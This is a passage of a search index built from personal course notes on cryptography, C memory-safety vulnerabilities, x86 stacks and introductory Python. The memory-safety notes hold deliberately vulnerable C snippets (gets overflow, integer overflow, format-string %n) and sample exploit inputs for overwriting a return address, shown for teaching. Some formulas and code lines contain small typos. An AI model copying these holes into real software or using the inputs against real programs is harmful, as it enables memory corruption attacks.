who knows the backdoor to invert the function. - one-way: encryption with public key - backdoor: decryption with private key</p>"},{"location":"cs161/Cryptography/asymmetric/#rsa","title":"RSA","text":"<p>RSA public-key cryptosystem, named after its inventors Ronald Rivest, Adi Shamir and Leonard Adleman</p> <p>RSA Hardness:  Suppose \\(n = pq\\), i.e. \\(n\\) is the product of two large primes \\(p\\) and \\(q\\). Given \\(c =m^e \\pmod n\\) and \\(e\\), it is computationally hard to find \\(m\\). However, with the factorization of \\(n\\) (i.e. \\(p\\) or \\(q\\)), it becomes easy to find \\(m\\).</p> <p>Let \\(p\\) and \\(q\\) be two large primes (typically having, say, 512 bits each), and let \\(N = pq\\).  Also, let \\(e\\) be any number that is relatively prime to \\((p\u22121)(q\u22121)\\). (Typically \\(e\\) is chosen to be a small value such as 3.) </p> <p>Then Bob\u2019s public key is the pair of numbers \\((N,e)\\).  The private key is the number \\(d\\), which is the inverse of \\(e\\) mod \\((p\u22121)(q\u22121)\\). (This inverse is guaranteed to exist because \\(e\\) and \\((p\u22121)(q\u22121)\\) are coprime.)</p> <p>encryption: \\(C = M^e \\mod N\\)</p> <p>decryption: \\(M = C^d \\mod N\\)</p> <p>deterministic, so not IND-CPA secure</p> <p>public-key padding is a tool for mixing in some randomness so that the ciphertext output \u201clooks random,\u201d but can still be decrypted to retrieve the original plaintext.</p> <p>Despite the name, RSA padding modes are more similar to the IVs in block cipher modes than the padding in block cipher modes. </p> <p>One common padding scheme is OAEP (Optimal Asymmetric Encryption Padding). </p> <ul> <li>Encryption\uff1a <pre><code>r = random()\nmasked_m = M XOR MGF(r)\nmasked_r = r XOR MGF(masked_m)\nEM = masked_m||masked_r\nC = RSA_Enc(EM, PK)\n</code></pre></li> <li>Decryption: <pre><code>EM = RSA_Dec(C, SK)\nr = masked_r XOR MGF(masked_m)\nM = masked_m XOR MGF(r)\n</code></pre></li> </ul>"},{"location":"cs161/Cryptography/asymmetric/#el_gamal_encryption","title":"El Gamal encryption","text":"<ul> <li> <p>System parameters: a 2048-bit prime \\(p\\), and a value \\(g\\) in the range \\(2 \\ldots p-2\\). Both are arbitrary, fixed, and public.</p> </li> <li> <p>Key generation: Bob picks \\(b\\) in the range \\(0 \\ldots p-2\\) randomly, and computes \\(B = g^{b} \\bmod p\\). His public key is \\(B\\) and his private key is \\(b\\).</p> </li> <li> <p>Encryption: \\(E_{B}(m) = (g^{r} \\bmod p, m \\times B^{r} \\bmod p)\\) where \\(r\\) is chosen randomly from \\(0 \\ldots p-2\\).</p> </li> <li> <p>Decryption: \\(D_{b}(R, S) = R^{-b} \\times S \\bmod p\\).</p> </li> </ul>"},{"location":"cs161/Cryptography/asymmetric/#public_key_distribution","title":"Public Key Distribution","text":"<p>Attila the attacker could broadcast his own public key, pretending to be Bob: he could send a spoofed broadcast message that appears to be from Bob, but that contains a public key that Attila generated. </p>"},{"location":"cs161/Cryptography/asymmetric/#session_keys","title":"Session Keys","text":"<p>Because public key schemes are expensive and difficult to make IND-CPA secure, we tend to only use public key cryptography to distribute one or more session keys, which are the keys used to actually encrypt and authenticate the message</p> <p>Often, we generate several different session keys for different purposes (MAC, encrypt...).</p> <p>Alice: generates a random set of session keys.  encrypts the message using a symmetric algorithm with the session keys encrypts the random session keys with Bob\u2019s public key</p> <p>Bob: decrypts the session keys uses the session keys to decrypt the original message.</p>"},{"location":"cs161/Cryptography/asymmetric/#digital_signature","title":"Digital Signature","text":"\\[ \\begin{aligned} S = Sign(SK, M)\\\\ Verify(PK, M, S) -&gt; true / false \\end{aligned} \\]"},{"location":"cs161/Cryptography/hash/","title":"Hash Functions","text":""},{"location":"cs161/Cryptography/hash/#cryptographic_hashes","title":"Cryptographic Hashes  <p>A cryptographic hash function is a function,\\(H\\) , that when applied on a message,\\(M\\) , can be used to generate a fixed-length \u201cfingerprint\u201d of the message.</p>","text":""},{"location":"cs161/Cryptography/hash/#properties","title":"Properties","text":"<p>deterministic </p> <p>unkeyed</p> <p>Avalanche effect: a small change in the input causes a significant and unpredictable change in the output hash value.</p> <ul> <li> <p>One-way / Preimage resistant: given a hash output \\(y\\), it's infeasible to find any \\(x\\) such that \\(H(x) = y\\)</p> </li> <li> <p>Second preimage resistant: Given an input \\(x\\), it's infeasible to find another input \\(x'\\) such that \\(H(x) = H(x')\\)</p> </li> <li> <p>Collision resistant: It's infeasible to find any pair of messagess \\(x,x'\\) such that \\(H(x) = H(x')\\)</p> </li> </ul> <p>infeasible: there is no known way to accomplish it with any realistic amount of computing power</p> <p>Under certain threat models, hash functions can be used to verify message integrity. </p>"},{"location":"cs161/Cryptography/intro/","title":"Introduction","text":"<p>Confidentiality is the property that prevents adversaries from reading our private data. The ciphertext C should give the attacker no additional information about the message M.</p> <p>Integrity is the property that prevents adversaries from tampering with our private data.</p> <p>Authenticity is the property that lets us determine who created a given message.</p>"},{"location":"cs161/Cryptography/intro/#ind-cpa_security","title":"IND-CPA Security","text":"<p>indistinguishability under chosen plaintext attack (IND-CPA) game</p> <ol> <li> <p>The adversary Eve chooses two different messages, \\(M_0\\) and \\(M_1\\), and sends both messages to Alice.</p> </li> <li> <p>Alice chooses a bit \\(b \\in \\{0, 1\\}\\) uniformly at random, and then encrypts \\(M_b\\). Alice sends the encrypted message \\(Enc(K, M_b)\\) back to Eve.</p> </li> <li> <p>Eve is now allowed to ask Alice for encryptions of messages of Eve\u2019s choosing. Eve can send a plaintext message to Alice, and Alice will always send back the encryption of the message with the secret key. Eve is allowed to repeat this as many times as she wants. Intuitively, this step is allowing Eve to perform a chosen-plaintext attack in an attempt to learn something about which message was sent.</p> </li> <li> <p>After Eve is finished asking for encryptions, she must guess whether the encrypted message from step 2 is the encryption of \\(M_0\\) or \\(M_1\\).</p> </li> </ol>"},{"location":"cs161/Cryptography/intro/#threat_models","title":"Threat models","text":"<ul> <li>ciphertext-only attack</li> <li>known plaintext attack Eve has intercepted an encrypted message and also already has some partial information about the plaintext</li> <li>replay attack  Eve can capture an encrypted message from Alice to Bob and re-send the encrypted message to Bob again.</li> <li>chosen-plaintext attack Eve can trick Alice to encrypt arbitrary messages of Eve\u2019s choice, for which Eve can then observe the resulting ciphertexts.</li> <li>chosen-ciphertext attack Eve can trick Bob into decrypting some ciphertexts. </li> </ul>"},{"location":"cs161/Cryptography/symmetric/","title":"Symmetric","text":""},{"location":"cs161/Cryptography/symmetric/#symmetric-key_encryption","title":"Symmetric-Key Encryption   <p>we are going to assume that all messages are bitstrings, which is a sequence of bits, 0 or 1</p>","text":""},{"location":"cs161/Cryptography/symmetric/#symmtric-key_encrytion","title":"Symmtric-Key Encrytion","text":"<p>Algorithm: $$ \\begin{aligned} K = KeyGen() \\ C = Enc(M, K) \\ M = Dec(C, K) \\end{aligned} $$ Correctness:  $$ Dec(Enc(M), K) = K $$</p>"},{"location":"cs161/Cryptography/symmetric/#one_time_pad_otp","title":"One Time Pad (OTP)","text":"<p>Encryption: \\(C = M \\oplus K\\) Decryption: \\(M = C \\oplus K\\)</p> <p>Correctness: \\((M \\oplus K) \\oplus K = M\\)</p> <p>Drawback: The shared key cannot be reused to transmit another message</p> <p>if a key is uesd twice:</p> \\[ \\begin{aligned} C_1 = M_1 \\oplus K \\\\ C_2 = M_2 \\oplus K \\\\ =&gt; C_1 \\oplus C_2 = M_1 \\oplus M_2 \\end{aligned} \\]"},{"location":"cs161/Cryptography/symmetric/#block_ciphers","title":"Block Ciphers","text":"<p>Encryption takes in an n-bit plaintext and a k-bit key as input and outputs an n-bit ciphertext.  Decryption takes in an n-bit ciphertext and a k-bit key as input and outputs an n-bit plaintext. $$ E:{0,1}^n \\times {0,1}^k -&gt; {0, 1}^n $$ given K: $$ E_k:{0,1}^n -&gt; {0, 1}^n $$</p> <p>AES: k = 128, 192, 256</p> <p>Correctness: \\(Ek(M)\\) should be bijective  Efficiency: XORs and bit-shifting (fast) Security:  - computationally indistinguishable from random permutation - not IND-CPA secure since it's deterministic</p>"},{"location":"cs161/Cryptography/symmetric/#block_cipher_modes_of_operation","title":"Block Cipher Modes of Operation","text":"<p>Issues of block cipher: - fixed-length message - determinitic</p> <p>To fix these problems, the encryption algorithm can either be randomized or stateful.  The decryption algorithm, however, is neither randomized nor stateful.</p> <p>ECB Mode (Electronic Code Book) - break M into n-bit blocks  - encode each block - concatenate</p> <p>encryption: \\(C_i = E_k(M_i)\\)</p> <p>decryption: \\(M_i = D_k(C_i)\\)</p> <p>CBC Mode (Cipher Block Chaining) </p> <p>Probabilistic Encryption if IV is random</p> <p>CFB Mode (Ciphertext Feedback Mode)</p> <p>OFB Mode (Output Feedback Mode)</p> <p>Counter (CTR) Mode</p> <p>encryption: \\(C_i = E_k(IV||i) \\oplus M_i\\)</p> <p>decryption: \\(M_i = E_k(IV||i) \\oplus C_i\\)</p> <p></p> sequential parallel <p>https://textbook.cs161.org/crypto/symmetric.html#64-block-ciphers</p>"},{"location":"cs161/Cryptography/symmetric/#padding","title":"Padding","text":"<p>Padding is the process of adding extra data to a message \u200b\u200bbefore\u200b\u200b encryption to ensure its length meets the specific requirements of the cryptographic algorithm.</p> <p>One correct padding scheme is PKCS#7 padding. In this scheme, we pad the message by the number of padding bytes used.</p>"},{"location":"cs161/Cryptography/symmetric/#aes","title":"AES","text":"<p>AES encryption operates on a block of data through multiple rounds of processing.  Each round applies a set of reversible transformations to a two-dimensional 4x4 array of bytes called the \u200b\u200bState\u200b\u200b.</p> <p>The main steps for encrypting a single 128-bit block are:</p> <p>Key Expansion   The original cipher key is used to derive a set of round keys (a key schedule) using the Rijndael key schedule algorithm.</p> <p>Initial Round:\u200b - \u200b\u200bAddRoundKey   Each byte of the state is combined with a round key using bitwise XOR.</p> <p>Main Rounds (Repeated for 9, 11, or 13 rounds depending on key size):\u200b - SubBytes   A non-linear substitution step where each byte is replaced with another byte according to a lookup table (S-box).    This provides confusion. - ShiftRows   A transposition step where each row of the state is shifted cyclically a certain number of steps. The first row is not shifted, the second is shifted by one, etc.    This provides diffusion. - MixColumns   A mixing operation which operates on the columns of the state, combining the four bytes in each column.    This also provides diffusion. - AddRoundKey   The round key is XOR'd with the state again.</p> <p>Final Round (No MixColumns):\u200b\u200b</p> <ul> <li>\u200bSubBytes\u200b\u200b</li> <li>\u200b\u200bShiftRows\u200b\u200b</li> <li>\u200b\u200bAddRoundKey\u200b</li> </ul>"},{"location":"cs161/Cryptography/symmetric/#message_authentication_codes_macs","title":"Message Authentication Codes (MACs)","text":"<p>A MAC is a keyed checksum of the message that is sent along with the message. It takes in a fixed-length secret key and an arbitrary-length message, and outputs a fixed-length checksum.  A secure MAC has the property that any change to the message will render the checksum invalid.</p> <p>Alice:  compute a MAC \\(T = F(K,M)\\) send \\((M,T)\\) to Bob</p> <p>Bob: recompute \\(F(K,M)\\) and check if it matches \\(T\\)</p>"},{"location":"cs161/Cryptography/symmetric/#diffie-hellman_key_exchange","title":"Diffie-Hellman key exchange","text":"<p>One-way functions</p> <p>Discrete logarithm problem:</p> <p>\\(f(x) = g^x \\pmod p\\), where \\(p\\) is a large prime and \\(g\\) is a specially-chosen generator</p> <p>Given \\(f(x)\\), there is no known efficient algorithm to solve for \\(x\\).</p> <p>Alice picks a secret \\(a \\in \\{0,1,...,p-2\\}\\) and computes \\(A=g^a \\mod p\\). Bob picks a secret \\(b\\) and computes \\(B=g^b \\mod p\\). </p> <p>Alice compute $$ S=B^a = g^{ab} $$</p> <p>Bob compute $$ S=A^b = g^{ab} $$</p>"},{"location":"cs161/memory%20safety/mitigating/","title":"Mitigating","text":""},{"location":"cs161/memory%20safety/mitigating/#mitigating_memory-safety_vulnerabilities","title":"Mitigating Memory-Safety Vulnerabilities","text":""},{"location":"cs161/memory%20safety/mitigating/#address_space_layout_randomization_aslr","title":"Address Space Layout Randomization (ASLR)","text":"<p>With ASLR, each time the program is run, the beginning of each section of memory is randomly chosen. Also, if the program imports libraries, we can also randomize the starting addresses of each library\u2019s source code.</p> <p>There are some constraints to randomizing the sections of memory. For example, segments usually need to start at a page boundary. In other words, the starting address of reach section of memoy needs to be a multiple of the page size (typically 4096 bytes in a 32-bit architecture).</p>"},{"location":"cs161/memory%20safety/vulnerabilities/","title":"Vulnerabilities","text":""},{"location":"cs161/memory%20safety/vulnerabilities/#memory_safety_vulnerabilities","title":"Memory Safety Vulnerabilities","text":""},{"location":"cs161/memory%20safety/vulnerabilities/#buffer_overflow","title":"Buffer Overflow","text":"<p>Buffer overflow vulnerabilities are a particular risk in C</p> <p>Absence of automatic bounds-checking for array or pointer accesses: if the programmer declares an array char <code>buffer[4]</code>, C will not automatically throw an error if the programmer tries to access <code>buffer[5]</code></p> <pre><code>char buf[8];\nint authenticated = 0;\nvoid vulnerable() {\n    gets(buf);\n}\n</code></pre> <ul> <li> <p>Defined outside of the function, <code>char buf[8]</code> and <code>authenticated</code> are both located in the static part of memory.</p> </li> <li> <p>In C, static memory is filled in the order that variables are defined, so <code>authenticated</code> is at a higher address in memory than <code>buf</code></p> </li> </ul> <p>static: |   | |---| |authenticated| |buf| |buf| || </p> <p>If the attacker can write 9 bytes of data to buf (with the 9<sup>th</sup> byte set to a non-zero value), then this will set the authenticated flag to true, and the attacker will be able to gain access.</p> <p><pre><code>char buf[8];\nint (*fnptr)();\nvoid vulnerable() {\n    gets(buf);\n}\n</code></pre> |   | |---| | fnptr  | |buf| |buf| || </p> <p>the attacker can overwrite fnptr with any address of their choosing, redirecting program execution to some other memory location</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#stack_smashing","title":"Stack Smashing","text":"<p>One powerful method for exploiting buffer overrun vulnerabilities takes advantage of the way local variables are laid out on the stack.</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#stack_memory_layout","title":"Stack Memory Layout","text":"<p><pre><code>void vulnerable() {\n    char buf[8];\n    gets(buf);\n}\n</code></pre> stack: || |---| |rip of vulnerable| |fsp of vulnerable| |buf| |buf| ||</p> <p>Data storage order: - The stack only grows down when we call a new function and need to allocate additional memory. When we call <code>gets</code>, user input is still written from lower addresses to higher addresses. - x86 is little-endian</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#attack","title":"Attack","text":"<ul> <li> <p>shellcode at a known address input: AAAAAAAAAAAA\\xef\\xbe\\xad\\xde</p> 0xDEADBEEF AAAA AAAA AAAA </li> <li> <p>shellcode injection</p> </li> <li> <p>short:     ||     |---|     |&amp;buf|     |AAAA|     |shellcode|     |shellcode|     ||</p> </li> <li> <p>long:     ||     |---|     |shellcode|     |&amp;rip + 4|     |AAAA|     |AAAA|     |AAAA|     ||</p> </li> </ul>"},{"location":"cs161/memory%20safety/vulnerabilities/#vulnerable_c_library_functions","title":"Vulnerable C Library Functions","text":"<ul> <li>gets -&gt; fgets   <pre><code>char name[20];\nfgets(name, sizeof(name), stdin);\n</code></pre></li> <li>strcpy -&gt; strncpy / strlcpy</li> <li>strlen -&gt; strnlen</li> <li>sprintf -&gt; snprintf</li> </ul>"},{"location":"cs161/memory%20safety/vulnerabilities/#integer_overflow","title":"Integer Overflow","text":"<p>C compiler won\u2019t warn about the type mismatch between signed <code>int</code> and <code>unsigned int</code>; it silently inserts an implicit cast.  <pre><code>void *memcpy(void *dest, const void *src, size_t n);\n</code></pre> <pre><code>typedef unsigned int size_t;\n</code></pre></p> <p><pre><code>char buf[8];\nvoid vulnerable() {\n    int len = read_int_from_network();\n    char *p = read_string_from_network();\n    if (len &gt; 8) {\n        error(\"length too large: bad dog, no cookie for you!\");\n        return;\n    }\n    memcpy(buf, p, len);\n}\n</code></pre> paylaod: a negative <code>len</code></p> <p><pre><code>void vulnerable() {\n    size_t len;\n    char *buf;\n\n    len = read_int_from_network();\n    buf = malloc(len+5);\n    read(fd, buf, len);\n    ...\n}\n</code></pre> payload: a large <code>len</code> e.g. 0xFFFFFFFF In this case, the code allocates a 4-byte buffer and then writes a lot more than 4 bytes into it: a classic buffer overflow.</p> <p>check bounds whenever add to integers <pre><code>void safe(size_t len, char *data){\n    if (len &gt; MAX_SIZE - 2) {\n        return;\n    }\n    char *buf = malloc(len + 2);\n    if (!buf) {\n        return;\n    }\n    memcpy(buf, data, len);\n    buf[len] = '\\n';\n    buf[len + 1] '\\0';\n}\n</code></pre></p>"},{"location":"cs161/memory%20safety/vulnerabilities/#format_string_vulnerabilities","title":"Format string vulnerabilities","text":"<p><pre><code>printf(\"x has the value %d, y has the value %d, z has the value %d \\n\", x, y, z);\n</code></pre> arguments to a function are pushed onto the stack in reverse order || |---| |z| |y| |x| |&amp;\"x has the value %d, y has the value %d, z has the value %d \\n\"| |rip of printf| |sfp of printf|</p> <p>In cases of a mismatch, it will fetch some data from the stack that does not belong to the function call. <pre><code>printf(\"x has the value %d, y has the value %d, z has the value %d \\n\", x, y);\n</code></pre></p> <p>%n \u2192 Treat the argument as an address and write the number of characters that have been printed so far to that address <pre><code>printf(\"item %d:%n\", 3, &amp;val);   // store 7 in val\n</code></pre> mismatch: <pre><code>printf(\"000%n\");    // write 3 to the integer pointed to by address located 8 bytes above the RIP of printf\n</code></pre> || |---| |???    // fetch this as the second argument, treat it as a pointer| |&amp;\"000%n\"   // the first argument| |rip of printf| |fsp of printf|</p> <p><pre><code>char buf[64]\n\nvoid vulnerable(void) {\n    char *secret_string = \"pancake\";\n    int secret_number = 42;\n    if (fgets(buf, 64, stdin) == NULL) {\n        return;\n    } \n    printf(buf);\n}\n</code></pre> || |---| |&amp;secret_string| |secret_number| |&amp;buf -&gt; \"%d%n\"| |rip of printf| ||</p> <ul> <li>input: %d%n</li> <li>output: 42  write 2 to the secret_string</li> </ul> <p>never use untrusted input in the first argument of printf <pre><code>printf(\"%s\", buf);\n</code></pre></p>"},{"location":"cs161/memory%20safety/vulnerabilities/#heap_vulnerability","title":"Heap Vulnerability","text":"<p>Objects are allocated in the heap (using <code>malloc</code> in C and <code>new</code> in C++...)</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#heap_overflow","title":"Heap Overflow","text":"<p>C++ vtable Each class has a virtual table (table of function pointers), and each object points to its class's vtable  Suppose an instance variable of x is a buffer that we can overflow:  when y calls its method, the shellcode will be executed</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#use-after-free","title":"Use-after-free","text":"<pre><code>void test_uaf() {\n    int *arr1 = malloc(10 * sizeof(int));\n    free(arr1); // the memory is freed, but arr1 still points to it\n\n    int *arr2 = malloc(10 * sizeof(int));  \n    for (int i = 0; i &lt; 10; i++) {\n        arr2[i] = i + 100;  \n    }\n\n    printf(\"UAF: %d\\n\", arr1[0]); // might print 100\n}\n</code></pre>"},{"location":"cs161/memory%20safety/x86/","title":"x86 Assembly","text":""},{"location":"cs161/memory%20safety/x86/#memory_layout","title":"Memory Layout","text":""},{"location":"cs161/memory%20safety/x86/#little_endian","title":"Little Endian","text":"<p>x86 is a little-endian system. This means that when storing a word in memory, the least significant byte is stored at the lowest address, and the most significant byte is stored at the highest address.</p>"},{"location":"cs161/memory%20safety/x86/#registers","title":"Registers","text":"<p>The e in the register abbreviations stands for \u201cextended\u201d and indicates that we are using a 32-bit system (extended from the original 16-bit systems).</p> <ul> <li><code>eip</code> is the instruction pointer, and it stores the address of the machine instruction currently being executed. </li> <li><code>ebp</code> is the base pointer, and it stores the address of the top of the current stack frame. </li> <li><code>esp</code> is the stack pointer, and it stores the address of the bottom of the current stack frame. </li> </ul> <p>The top of the current stack frame is the highest address associated with the current stack frame, and the bottom of the stack frame is the lowest address associated with the current stack frame.</p>"},{"location":"cs161/memory%20safety/x86/#pushing_and_popping","title":"Pushing and Popping","text":"<p>push: - First, we have to allocate additional space on the stack by decrementing <code>esp</code>.  - Then, we store the value in the newly allocated space. </p> <p>pop: - The x86 pop instruction increments <code>esp</code> to remove the next value on the stack.  - It also takes the value that was just popped and copies the value into a register.</p>"},{"location":"cs161/memory%20safety/x86/#function_calls","title":"Function Calls","text":"<p>In this example, main is the caller function and foo is the callee function. </p> <ol> <li>Push arguments onto the stack.</li> <li>Push the old eip / rip (return instruction pointer) on the stack.</li> <li>Update eip.</li> <li>Push the old ebp / sfp (saved frame pointer) on the stack. </li> <li>Move ebp down.</li> <li>Move esp down.    Allocate new space for the new stack frame</li> <li>Execute the function.        Local variables and any other necessary data can now be saved in the new stack frame.     Additionally, since <code>ebp</code> is always pointing at the top of the stack frame, we can use it as a point of reference to find other variables on the stack. </li> <li>Move esp up.    Once the function is ready to return, we increment esp to point to the top of the stack frame (ebp).     (Anything on the stack below esp is undefined.)</li> <li>Restore the old ebp (sfp). </li> <li>Restore the old eip (rip). </li> <li>Remove arguments from the stack.     We remove them by incrementing esp.</li> </ol>"},{"location":"cs61a%20notes/00Getting%20Started/","title":"00Getting Started","text":""},{"location":"cs61a%20notes/00Getting%20Started/#getting_started","title":"Getting Started","text":""},{"location":"cs61a%20notes/00Getting%20Started/#useful_python_command_line_options","title":"Useful Python Command Line Options","text":"<p><pre><code>python3 lab00.py\n</code></pre> <pre><code>python3 -i lab00.py\n</code></pre> - opens an interactive session (with a &gt;&gt;&gt; prompt) - To exit, type exit() or Ctrl-D <pre><code>python3 -m doctest lab00.py\n</code></pre> - Runs the doctests in a file doctests:     - the examples in the docstrings of functions     - Each test in the file consists of &gt;&gt;&gt; followed by some Python code and the expected output.     - example</p> <pre><code>```py\ndef div(a, b):\n\"\"\"\n&gt;&gt;&gt; div(10, 0)\nZeroDivisionError\n\"\"\"\nreturn a / b \n```\n</code></pre> <ul> <li>When our code passes all of the doctests, no output is displayed. Otherwise, information about the tests that failed will be displayed.</li> </ul>"},{"location":"cs61a%20notes/00Getting%20Started/#debug","title":"Debug","text":"<ul> <li>It is generally bad practice to release code with debugging print statements left in</li> <li>It is generally good practice to release code with assertion statements left in</li> <li>Debugging is not a substitute for testing</li> </ul> <p>If your function contains a call to print that starts with \"DEBUG:\", then this line will be ignored by OK. (Otherwise, including extra print calls can cause tests to fail because of the additional output displayed.) <pre><code>print(\"DEBUG:\", x)\n</code></pre> open an interactive terminal to investigate a failing test for question sum_digits in assignment lab01 <pre><code>python3 ok -q sum_digits -i\n</code></pre></p>"},{"location":"cs61a%20notes/00Getting%20Started/#print_return","title":"print &amp; return","text":"<pre><code>&gt;&gt;&gt; def bake(cake, make):\n...    if cake == 0:\n...        cake = cake + 1\n...        print(cake)\n...    if cake == 1:\n...        print(make)\n...    else:\n...        return cake\n...    return make\n&gt;&gt;&gt; bake(0, 29)\n\n(line 1)? mashed potatoes\n(line 2)? 'mashed potatoes'\n</code></pre>"},{"location":"cs61a%20notes/chap1/","title":"Chap1","text":""},{"location":"cs61a%20notes/chap1/#chapter_1_building_abstractions_with_functions","title":"Chapter 1: Building Abstractions with Functions","text":""},{"location":"cs61a%20notes/chap1/#11_getting_started","title":"1.1 Getting Started","text":""},{"location":"cs61a%20notes/chap1/#introduction","title":"Introduction","text":"<p>Statements &amp; Expressions Functions Functions encapsulate logic that manipulates data Objects An object seamlessly bundles together data and the logic that manipulates that data Interpreters Evaluating compound expressions requires a precise procedure that interprets code in a predictable way. A program that implements such a procedure, evaluating compound expressions, is called an interpreter.</p> <p>functions are objects, objects are functions, and interpreters are instances of both</p>"},{"location":"cs61a%20notes/chap1/#errors","title":"Errors","text":"<p>Test incrementally Isolate errors Check your assumptions</p>"},{"location":"cs61a%20notes/chap1/#types_of_errors","title":"Types of Errors","text":"<p>intepreter shows the line where the problem first detected, not necessarily the line needed to be updated! - syntax errors - runtime errors   Traceback - logic / behavior errors: can't be deteced by the inrepreter</p>"},{"location":"cs61a%20notes/chap1/#12_elements_of_programming","title":"1.2 Elements of Programming","text":""},{"location":"cs61a%20notes/chap1/#methchanisms","title":"Methchanisms","text":"<p>primitive expressions and statements, which represent the simplest building blocks that the language provides means of combination, by which compound elements are built from simpler ones means of abstraction, by which compound elements can be named and manipulated as units.</p>"},{"location":"cs61a%20notes/chap1/#expressions","title":"Expressions","text":""},{"location":"cs61a%20notes/chap1/#primitive_expressions","title":"Primitive expressions","text":"<p>Numbers combined with mathematical operators</p>"},{"location":"cs61a%20notes/chap1/#call_expressions","title":"Call Expressions","text":"<p>subexpressions: the operator is an expression that precedes parentheses, which enclose a comma-delimited list of operand expressions. operator :function operands :parameter</p> <p>intepreter procedure: 1. find the value of operator &amp; operands 2. apply the function to the parameters <pre><code>def if_(c, x, y):\n    if c:\n        return x\n    else:\n        return y\n\ndef real_sqrt(x):\n    return if_(x &gt;=0, sqrt(x), 0)\n</code></pre></p> <pre><code>&gt;&gt;&gt;real_sqrt(-16)\nerror   # think why!!\n</code></pre>"},{"location":"cs61a%20notes/chap1/#nested_expressions","title":"Nested Expressions","text":"<p>recursive in nature expression tree What we need to evaluate are not call expressions, but primitive expressions such as numerals (e.g., 2) and names (e.g.add).</p>"},{"location":"cs61a%20notes/chap1/#library_functions","title":"Library Functions","text":"<p>import statements</p>"},{"location":"cs61a%20notes/chap1/#names","title":"Names","text":""},{"location":"cs61a%20notes/chap1/#bind_name_to_value_function","title":"bind name to value / function","text":"<ul> <li>assignment statement</li> <li>import statement</li> <li>function definition</li> </ul> <p>Both def statements and assignment statements bind names to values, and any existing bindings are lost <pre><code>f = max\nmax = 5\nf(1,2)\n</code></pre></p> <p>All expressions to the right of = are evaluated before any names to the left are bound to those values.  <pre><code>x, y = 3, 4.5\ny, x = x, y\n</code></pre></p>"},{"location":"cs61a%20notes/chap1/#environment","title":"Environment","text":"<p>memory that keeps track of the names, values, and bindings An environment consists of a sequence of frames Each frame contains bindings - 1 global frame - local frames - ...</p>"},{"location":"cs61a%20notes/chap1/#13_function","title":"1.3 Function","text":""},{"location":"cs61a%20notes/chap1/#type","title":"Type","text":"<p>Pure functions  Functions have some input (their arguments) and return some output (the result of applying them). Non-pure functions  In addition to returning a value, applying a non-pure function can generate side effects, which make some change to the state of the interpreter or computer. The value that print returns is always None <pre><code>&gt;&gt;&gt; print(print(1), print(2))\n1\n2\nNone None\n</code></pre></p> <p>about None:</p> <p></p>"},{"location":"cs61a%20notes/chap1/#name","title":"Name","text":"<ul> <li>intrinsic name</li> <li>bound name</li> </ul>"},{"location":"cs61a%20notes/chap1/#component","title":"Component","text":"<p> Function Signatures A description of the formal parameters all built-in functions will be rendered as <code>&lt;name&gt;(...)</code>, because these primitive functions were never explicitly defined.</p>"},{"location":"cs61a%20notes/chap1/#calling_user-defined_functions","title":"Calling User-Defined Functions","text":"<p> nested calling  \u26a0\ufe0fthe inside <code>square</code> is called before the outside <code>square</code> , its frame being built earlier too  (remember the logic of call expression!!!)</p> <p>What we need to evaluate are not call expressions, but primitive expressions such as numerals (e.g., 2) and names (e.g.add).</p> <p>Name Evaluation - parameter: the meaning of a function should be independent of the parameter names chosen by its author \u2192 the parameter names of a function must remain local to the body of the function. only 2 approaches: 1.passed -&gt; 2. Default Argument Values</p> <pre><code>```py\ndef pirate(arggg):  #this parameter is never used\n    def plunder(arggg):\n        return arggg    # plunder is identity function        \n    return plunder\n```\n```bash\n&gt;&gt;&gt;pirate(pirate(pirate))(3)\n3   # regardless of the parameter, the return value of pirate is identity function\n```\nthe `arggg` in plunder can't be fetched from pirate since it's a parameter!!!\n</code></pre> <ul> <li>var in body: LEGB (Local \u2192 Enclosing \u2192 Global \u2192 Built-in)</li> </ul>"},{"location":"cs61a%20notes/chap1/#functions_as_abstractions","title":"Functions as Abstractions","text":"<p>relies only on the relationship between its input arguments and its output values (&amp; side effects). \"black box\"</p>"},{"location":"cs61a%20notes/chap1/#aspects_of_a_functional_abstraction","title":"Aspects of a functional abstraction","text":"<ul> <li>domain: arguments</li> <li>range: return value</li> <li>intent: relationship between inputs and output (&amp; side effects)</li> </ul>"},{"location":"cs61a%20notes/chap1/#operators","title":"Operators","text":"<p>short-hand for call expressions e.g <code>/</code>: truediv <code>//</code>: floordiv <code>%</code>: mod</p>"},{"location":"cs61a%20notes/chap1/#14_designing_functions","title":"1.4 Designing Functions","text":""},{"location":"cs61a%20notes/chap1/#principle","title":"Principle","text":"<ul> <li>exactly one job</li> <li>Don't repeat yourself</li> <li>defined generally</li> </ul>"},{"location":"cs61a%20notes/chap1/#documentation","title":"Documentation","text":"<p>docstring: documentation describing the function - indented along with the function body. - triple quoted - first line describes the job of the function in one line - following lines describe arguments and clarify the behavior of the function</p>"},{"location":"cs61a%20notes/chap1/#15_control","title":"1.5 Control","text":""},{"location":"cs61a%20notes/chap1/#statements","title":"Statements","text":"<p>Statements govern the relationship among different expressions in a program and what happens to their results.</p> <p>Expressions can also be executed as statements, in which case they are evaluated, but their value is discarded</p> <p>Control statements control the flow of a program's execution based on the results of logical comparisons</p>"},{"location":"cs61a%20notes/chap1/#compound_statements","title":"Compound Statements","text":"<p>A simple statement is a single line that doesn't end in a colon</p> <p></p>"},{"location":"cs61a%20notes/chap1/#boolean","title":"Boolean","text":""},{"location":"cs61a%20notes/chap1/#boolean_contexts","title":"Boolean contexts","text":"<ul> <li>false values: 0, None, boolean value False. </li> <li>true value: other</li> </ul>"},{"location":"cs61a%20notes/chap1/#boolean_values","title":"Boolean values","text":"<p><code>True</code> &amp; <code>False</code> Functions that perform comparisons and return boolean values typically begin with <code>is</code></p>"},{"location":"cs61a%20notes/chap1/#boolean_operators","title":"Boolean operators","text":"<p><code>and</code> <code>or</code> <code>not</code></p> <p>short-circuiting <pre><code>def has_big_sqrt(x):\n    # wrong: return sqrt(x) &gt; 10\n    return x &gt; 0 and sqrt(x) &gt; 10\n</code></pre> - not: return Boolean value - and &amp; or: return the value of the last subexpression evaluated</p>"},{"location":"cs61a%20notes/chap1/#conditional_statements","title":"Conditional Statements","text":"<pre><code>if &lt;expression&gt;:\n    &lt;suite&gt;\nelif &lt;expression&gt;:\n    &lt;suite&gt;\nelse:\n    